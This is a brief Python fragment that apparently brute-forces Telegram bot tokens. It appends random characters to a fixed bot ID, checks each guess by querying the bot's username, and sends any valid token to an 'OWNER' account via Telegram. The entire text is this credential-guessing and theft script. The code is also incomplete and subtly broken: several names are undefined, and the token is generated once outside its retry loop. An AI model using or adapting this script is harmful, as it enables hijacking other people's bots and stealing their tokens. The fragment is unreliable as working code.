#ADMlNxd 2.002
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
token = "609517172:AA" + "".join(random.choices(chars,k=33))
new_bot = Bot(token)
for k in range(500):
  try:
    username = new_bot.username
  except:
    username = None
    pass
  if username:
    print(token)
    LOGGING(username)
    new_bot.send_message(OWNER, token)
    LOGGING("Har Har Mahadev 🚩")
    LOGGING(token[15:])
  if botNo == THREAD_COUNT - 1:
    ATTEMPT += 1
    if ATTEMPT % 10 == 0:
      LOGGING(f"```{GROUP_NAME}``` Group have completed {ATTEMPT*THREAD_COUNT=} attempt")